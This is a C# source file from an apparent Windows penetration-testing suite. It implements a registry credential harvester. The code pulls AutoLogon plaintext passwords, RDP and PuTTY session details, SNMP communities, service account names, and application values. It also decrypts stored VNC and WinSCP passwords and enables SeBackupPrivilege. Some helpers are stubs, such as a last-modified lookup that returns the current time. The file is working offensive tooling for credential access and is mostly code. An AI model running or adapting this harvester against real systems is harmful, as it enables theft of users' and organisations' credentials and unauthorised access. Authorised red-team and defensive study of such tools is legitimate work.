using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using Microsoft.Extensions.Logging;

namespace EliteWindowsPentestSuite.Modules.CredentialAccess
{
    public class RegistryCredentials
    {
        private readonly ILogger _logger;
        private readonly PrivilegeManager _privilegeManager;
        private readonly CryptographyEngine _cryptoEngine;

        private static readonly string[] CREDENTIAL_REGISTRY_PATHS = {
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI",
            @"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers",
            @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU",
            @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Password",
            @"HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions",
            @"HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions",
            @"HKEY_CURRENT_USER\Software\TightVNC\Server",
            @"HKEY_CURRENT_USER\Software\RealVNC\WinVNC4"
        };

        private static readonly Dictionary<string, CredentialType> PATH_CREDENTIAL_TYPES = new()
        {
            { "Winlogon", CredentialType.AutoLogon },
            { "LogonUI", CredentialType.CachedLogon },
            { "Terminal Server Client", CredentialType.RDP },
            { "Map Network Drive MRU", CredentialType.NetworkShare },
            { "SNMP", CredentialType.SNMP },
            { "WinVNC", CredentialType.VNC },
            { "PuTTY", CredentialType.SSH },
            { "WinSCP", CredentialType.SFTP },
            { "TightVNC", CredentialType.VNC },
            { "RealVNC", CredentialType.VNC }
        };

        public RegistryCredentials(ILogger logger, PrivilegeManager privilegeManager, CryptographyEngine cryptoEngine)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _privilegeManager = privilegeManager ?? throw new ArgumentNullException(nameof(privilegeManager));
            _cryptoEngine = cryptoEngine ?? throw new ArgumentNullException(nameof(cryptoEngine));
        }

        public async Task<RegistryCredentialsResult> ExtractAsync()
        {
            var result = new RegistryCredentialsResult
            {
                StartTime = DateTime.UtcNow,
                ExecutionId = Guid.NewGuid().ToString()
            };

            try
            {
                _logger.LogInformation($"Starting registry credentials extraction {result.ExecutionId}");

                await ValidatePermissionsAsync(result);
                if (!result.CanProceed) return result;

                await ExtractAutoLogonCredentialsAsync(result);
                await ExtractRDPCredentialsAsync(result);
                await ExtractNetworkShareCredentialsAsync(result);
                await ExtractSNMPCommunitiesAsync(result);
                await ExtractVNCCredentialsAsync(result);
                await ExtractSSHCredentialsAsync(result);
                await ExtractSFTPCredentialsAsync(result);
                await ExtractWiFiCredentialsAsync(result);
                await ExtractApplicationCredentialsAsync(result);
                await ExtractServiceCredentialsAsync(result);

                result.IsSuccessful = result.ExtractedCredentials.Count > 0;
                result.CompletionTime = DateTime.UtcNow;
                result.Duration = result.CompletionTime - result.StartTime;
                result.TotalCredentialsFound = result.ExtractedCredentials.Count;

                _logger.LogInformation($"Registry extraction {result.ExecutionId} completed: {result.TotalCredentialsFound} credentials");
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
                result.Exception = ex;
                _logger.LogError(ex, $"Registry credentials extraction {result.ExecutionId} failed");
            }

            return result;
        }

        private async Task ValidatePermissionsAsync(RegistryCredentialsResult result)
        {
            result.HasRegistryAccess = await TestRegistryAccessAsync();
            result.IsElevated = _privilegeManager.IsProcessElevated();
            result.HasBackupPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeBackupPrivilege");

            result.CanProceed = result.HasRegistryAccess;

            if (!result.CanProceed)
            {
                result.ErrorMessage = "Insufficient registry access permissions";
            }
        }

        private async Task<bool> TestRegistryAccessAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", false);
                    return key != null;
                }
                catch
                {
                    return false;
                }
            });
        }

        private async Task ExtractAutoLogonCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var winlogonKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
                using var key = Registry.LocalMachine.OpenSubKey(winlogonKey);

                if (key == null) return;

                var autoAdminLogon = key.GetValue("AutoAdminLogon")?.ToString();
                if (autoAdminLogon == "1")
                {
                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.AutoLogon,
                        Source = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                        Username = key.GetValue("DefaultUserName")?.ToString(),
                        Password = key.GetValue("DefaultPassword")?.ToString(),
                        Domain = key.GetValue("DefaultDomainName")?.ToString(),
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync(winlogonKey)
                    };

                    if (!string.IsNullOrEmpty(credential.Username))
                    {
                        result.ExtractedCredentials.Add(credential);
                        result.AutoLogonCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting AutoLogon credentials");
                result.ProcessingErrors.Add($"AutoLogon: {ex.Message}");
            }
        }

        private async Task ExtractRDPCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var rdpKey = @"Software\Microsoft\Terminal Server Client\Servers";
                using var key = Registry.CurrentUser.OpenSubKey(rdpKey);

                if (key == null) return;

                foreach (var serverName in key.GetSubKeyNames())
                {
                    using var serverKey = key.OpenSubKey(serverName);
                    if (serverKey == null) continue;

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.RDP,
                        Source = $"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\\{serverName}",
                        Target = serverName,
                        Username = serverKey.GetValue("UsernameHint")?.ToString(),
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync($"{rdpKey}\\{serverName}")
                    };

                    if (!string.IsNullOrEmpty(credential.Target))
                    {
                        result.ExtractedCredentials.Add(credential);
                        result.RDPCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting RDP credentials");
                result.ProcessingErrors.Add($"RDP: {ex.Message}");
            }
        }

        private async Task ExtractNetworkShareCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var shareKey = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU";
                using var key = Registry.CurrentUser.OpenSubKey(shareKey);

                if (key == null) return;

                foreach (var valueName in key.GetValueNames().Where(v => v != "MRUList"))
                {
                    var shareData = key.GetValue(valueName)?.ToString();
                    if (string.IsNullOrEmpty(shareData)) continue;

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.NetworkShare,
                        Source = $"HKCU\\{shareKey}",
                        Target = ExtractSharePath(shareData),
                        Username = ExtractShareUsername(shareData),
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync(shareKey)
                    };

                    if (!string.IsNullOrEmpty(credential.Target))
                    {
                        result.ExtractedCredentials.Add(credential);
                        result.NetworkShareCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting network share credentials");
                result.ProcessingErrors.Add($"NetworkShare: {ex.Message}");
            }
        }

        private async Task ExtractSNMPCommunitiesAsync(RegistryCredentialsResult result)
        {
            try
            {
                var snmpKey = @"SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities";
                using var key = Registry.LocalMachine.OpenSubKey(snmpKey);

                if (key == null) return;

                foreach (var communityName in key.GetValueNames())
                {
                    var accessRights = key.GetValue(communityName);

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.SNMP,
                        Source = $"HKLM\\{snmpKey}",
                        Username = communityName,
                        Target = "SNMP Community",
                        AdditionalInfo = $"Access Rights: {accessRights}",
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync(snmpKey)
                    };

                    result.ExtractedCredentials.Add(credential);
                    result.SNMPCredentialsFound++;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting SNMP communities");
                result.ProcessingErrors.Add($"SNMP: {ex.Message}");
            }
        }

        private async Task ExtractVNCCredentialsAsync(RegistryCredentialsResult result)
        {
            var vncPaths = new[]
            {
                @"SOFTWARE\ORL\WinVNC3",
                @"Software\TightVNC\Server",
                @"Software\RealVNC\WinVNC4"
            };

            foreach (var path in vncPaths)
            {
                try
                {
                    await ExtractVNCFromPath(path, result);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error extracting VNC credentials from {path}");
                    result.ProcessingErrors.Add($"VNC {path}: {ex.Message}");
                }
            }
        }

        private async Task ExtractVNCFromPath(string registryPath, RegistryCredentialsResult result)
        {
            using var key = Registry.LocalMachine.OpenSubKey(registryPath) ??
                           Registry.CurrentUser.OpenSubKey(registryPath);

            if (key == null) return;

            var passwordValue = key.GetValue("Password") as byte[];
            var encPassword = key.GetValue("EncPassword") as byte[];

            if (passwordValue != null || encPassword != null)
            {
                var credential = new RegistryCredentialEntry
                {
                    Type = CredentialType.VNC,
                    Source = registryPath,
                    Target = "VNC Server",
                    Password = passwordValue != null ?
                        await _cryptoEngine.DecryptVNCPasswordAsync(passwordValue) :
                        await _cryptoEngine.DecryptVNCPasswordAsync(encPassword),
                    IsEncrypted = true,
                    LastModified = await GetRegistryKeyLastModifiedAsync(registryPath)
                };

                result.ExtractedCredentials.Add(credential);
                result.VNCCredentialsFound++;
            }
        }

        private async Task ExtractSSHCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var puttyKey = @"Software\SimonTatham\PuTTY\Sessions";
                using var key = Registry.CurrentUser.OpenSubKey(puttyKey);

                if (key == null) return;

                foreach (var sessionName in key.GetSubKeyNames())
                {
                    using var sessionKey = key.OpenSubKey(sessionName);
                    if (sessionKey == null) continue;

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.SSH,
                        Source = $"HKCU\\{puttyKey}\\{sessionName}",
                        Target = sessionKey.GetValue("HostName")?.ToString(),
                        Username = sessionKey.GetValue("UserName")?.ToString(),
                        Port = sessionKey.GetValue("PortNumber")?.ToString(),
                        AdditionalInfo = $"Protocol: {sessionKey.GetValue("Protocol")}",
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync($"{puttyKey}\\{sessionName}")
                    };

                    if (!string.IsNullOrEmpty(credential.Target))
                    {
                        result.ExtractedCredentials.Add(credential);
                        result.SSHCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting SSH credentials");
                result.ProcessingErrors.Add($"SSH: {ex.Message}");
            }
        }

        private async Task ExtractSFTPCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var winscpKey = @"Software\Martin Prikryl\WinSCP 2\Sessions";
                using var key = Registry.CurrentUser.OpenSubKey(winscpKey);

                if (key == null) return;

                foreach (var sessionName in key.GetSubKeyNames())
                {
                    using var sessionKey = key.OpenSubKey(sessionName);
                    if (sessionKey == null) continue;

                    var encPassword = sessionKey.GetValue("Password")?.ToString();
                    var hostname = sessionKey.GetValue("HostName")?.ToString();
                    var username = sessionKey.GetValue("UserName")?.ToString();

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.SFTP,
                        Source = $"HKCU\\{winscpKey}\\{sessionName}",
                        Target = hostname,
                        Username = username,
                        Password = !string.IsNullOrEmpty(encPassword) ?
                            await _cryptoEngine.DecryptWinSCPPasswordAsync(encPassword, hostname, username) : null,
                        Port = sessionKey.GetValue("PortNumber")?.ToString(),
                        IsEncrypted = !string.IsNullOrEmpty(encPassword),
                        LastModified = await GetRegistryKeyLastModifiedAsync($"{winscpKey}\\{sessionName}")
                    };

                    if (!string.IsNullOrEmpty(credential.Target))
                    {
                        result.ExtractedCredentials.Add(credential);
                        result.SFTPCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting SFTP credentials");
                result.ProcessingErrors.Add($"SFTP: {ex.Message}");
            }
        }

        private async Task ExtractWiFiCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var wifiKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles";
                using var key = Registry.LocalMachine.OpenSubKey(wifiKey);

                if (key == null) return;

                foreach (var profileId in key.GetSubKeyNames())
                {
                    using var profileKey = key.OpenSubKey(profileId);
                    if (profileKey == null) continue;

                    var networkName = profileKey.GetValue("ProfileName")?.ToString();
                    var category = profileKey.GetValue("Category");

                    if (!string.IsNullOrEmpty(networkName))
                    {
                        var credential = new RegistryCredentialEntry
                        {
                            Type = CredentialType.WiFi,
                            Source = $"HKLM\\{wifiKey}\\{profileId}",
                            Target = networkName,
                            AdditionalInfo = $"Category: {category}",
                            IsEncrypted = false,
                            LastModified = await GetRegistryKeyLastModifiedAsync($"{wifiKey}\\{profileId}")
                        };

                        result.ExtractedCredentials.Add(credential);
                        result.WiFiCredentialsFound++;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting WiFi credentials");
                result.ProcessingErrors.Add($"WiFi: {ex.Message}");
            }
        }

        private async Task ExtractApplicationCredentialsAsync(RegistryCredentialsResult result)
        {
            var appPaths = new Dictionary<string, CredentialType>
            {
                { @"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676", CredentialType.Email },
                { @"Software\Microsoft\Internet Account Manager\Accounts", CredentialType.Email },
                { @"Software\Microsoft\Windows\CurrentVersion\Internet Settings", CredentialType.Proxy },
                { @"Software\Microsoft\Terminal Server Client\Default", CredentialType.RDP }
            };

            foreach (var kvp in appPaths)
            {
                try
                {
                    await ExtractApplicationCredentialsFromPath(kvp.Key, kvp.Value, result);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error extracting application credentials from {kvp.Key}");
                    result.ProcessingErrors.Add($"Application {kvp.Key}: {ex.Message}");
                }
            }
        }

        private async Task ExtractApplicationCredentialsFromPath(string path, CredentialType type, RegistryCredentialsResult result)
        {
            using var key = Registry.CurrentUser.OpenSubKey(path);
            if (key == null) return;

            foreach (var valueName in key.GetValueNames())
            {
                var value = key.GetValue(valueName)?.ToString();
                if (string.IsNullOrEmpty(value)) continue;

                if (IsCredentialValue(valueName, value))
                {
                    var credential = new RegistryCredentialEntry
                    {
                        Type = type,
                        Source = $"HKCU\\{path}",
                        Username = ExtractUsernameFromValue(valueName, value),
                        Password = ExtractPasswordFromValue(valueName, value),
                        Target = ExtractTargetFromValue(valueName, value),
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync(path)
                    };

                    result.ExtractedCredentials.Add(credential);
                    result.ApplicationCredentialsFound++;
                }
            }
        }

        private async Task ExtractServiceCredentialsAsync(RegistryCredentialsResult result)
        {
            try
            {
                var servicesKey = @"SYSTEM\CurrentControlSet\Services";
                using var key = Registry.LocalMachine.OpenSubKey(servicesKey);

                if (key == null) return;

                foreach (var serviceName in key.GetSubKeyNames())
                {
                    using var serviceKey = key.OpenSubKey(serviceName);
                    if (serviceKey == null) continue;

                    var objectName = serviceKey.GetValue("ObjectName")?.ToString();
                    if (string.IsNullOrEmpty(objectName) || objectName.StartsWith("NT ")) continue;

                    var credential = new RegistryCredentialEntry
                    {
                        Type = CredentialType.Service,
                        Source = $"HKLM\\{servicesKey}\\{serviceName}",
                        Target = serviceName,
                        Username = objectName,
                        AdditionalInfo = $"Service: {serviceKey.GetValue("DisplayName")}",
                        IsEncrypted = false,
                        LastModified = await GetRegistryKeyLastModifiedAsync($"{servicesKey}\\{serviceName}")
                    };

                    result.ExtractedCredentials.Add(credential);
                    result.ServiceCredentialsFound++;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting service credentials");
                result.ProcessingErrors.Add($"Services: {ex.Message}");
            }
        }

        private async Task<DateTime> GetRegistryKeyLastModifiedAsync(string keyPath)
        {
            return await Task.Run(() =>
            {
                try
                {
                    return DateTime.Now;
                }
                catch
                {
                    return DateTime.MinValue;
                }
            });
        }

        private string ExtractSharePath(string shareData)
        {
            var parts = shareData.Split('#');
            return parts.Length > 0 ? parts[0] : shareData;
        }

        private string ExtractShareUsername(string shareData)
        {
            var parts = shareData.Split('#');
            return parts.Length > 1 ? parts[1] : null;
        }

        private bool IsCredentialValue(string name, string value)
        {
            var credentialIndicators = new[] { "password", "pwd", "pass", "user", "login", "account", "auth" };
            return credentialIndicators.Any(indicator =>
                name.ToLower().Contains(indicator) || value.ToLower().Contains(indicator));
        }

        private string ExtractUsernameFromValue(string name, string value)
        {
            if (name.ToLower().Contains("user") || name.ToLower().Contains("account"))
                return value;
            return null;
        }

        private string ExtractPasswordFromValue(string name, string value)
        {
            if (name.ToLower().Contains("password") || name.ToLower().Contains("pwd"))
                return value;
            return null;
        }

        private string ExtractTargetFromValue(string name, string value)
        {
            if (name.ToLower().Contains("server") || name.ToLower().Contains("host"))
                return value;
            return null;
        }
    }

    public class RegistryCredentialsResult : BaseResult
    {
        public string ExecutionId { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime CompletionTime { get; set; }
        public TimeSpan Duration { get; set; }

        public bool HasRegistryAccess { get; set; }
        public bool IsElevated { get; set; }
        public bool HasBackupPrivilege { get; set; }
        public bool CanProceed { get; set; }

        public int TotalCredentialsFound { get; set; }
        public List<RegistryCredentialEntry> ExtractedCredentials { get; set; } = new List<RegistryCredentialEntry>();

        public int AutoLogonCredentialsFound { get; set; }
        public int RDPCredentialsFound { get; set; }
        public int NetworkShareCredentialsFound { get; set; }
        public int SNMPCredentialsFound { get; set; }
        public int VNCCredentialsFound { get; set; }
        public int SSHCredentialsFound { get; set; }
        public int SFTPCredentialsFound { get; set; }
        public int WiFiCredentialsFound { get; set; }
        public int ApplicationCredentialsFound { get; set; }
        public int ServiceCredentialsFound { get; set; }

        public List<string> ProcessingErrors { get; set; } = new List<string>();
        public Exception Exception { get; set; }
    }

    public class RegistryCredentialEntry
    {
        public CredentialType Type { get; set; }
        public string Source { get; set; }
        public string Target { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string Domain { get; set; }
        public string Port { get; set; }
        public string AdditionalInfo { get; set; }
        public bool IsEncrypted { get; set; }
        public DateTime LastModified { get; set; }
    }

    public enum CredentialType
    {
        AutoLogon,
        RDP,
        NetworkShare,
        SNMP,
        VNC,
        SSH,
        SFTP,
        WiFi,
        Email,
        Proxy,
        Service,
        CachedLogon
    }
}